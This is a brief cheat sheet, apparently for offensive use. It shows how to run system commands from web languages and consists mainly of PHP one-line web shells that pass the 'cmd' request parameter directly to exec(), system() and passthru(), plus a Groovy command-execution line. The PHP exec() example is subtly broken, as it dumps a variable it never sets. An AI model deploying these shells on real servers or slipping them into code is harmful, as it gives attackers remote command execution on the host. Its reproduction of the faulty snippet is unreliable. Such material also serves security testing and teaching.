# EXEC in Many Languages
This cheat sheet will provide many different examples of how to perform system(), exec(), and more in different web languages.
## PHP
PHP is widely used and can often have the system(), exec(), etc functions eenabled in the php.ini configuration file.
### Exec()
```
<?php
 exec($_GET['cmd'],$response);
 var_dump($output) # dump entire object to DOM
 ?>
```
### System()
```
<?php
 echo system($_GET['cmd']); # "echo()s" to the DOM
 ?>
```
### Passthru()
```
<?php
 passthru($_GET['cmd']); # displays right to the DOM
 ?>
```
## Groovy
Groovy/Java can execute commands and print the output like so,
```
print "cmd /c mvn".execute().text
```
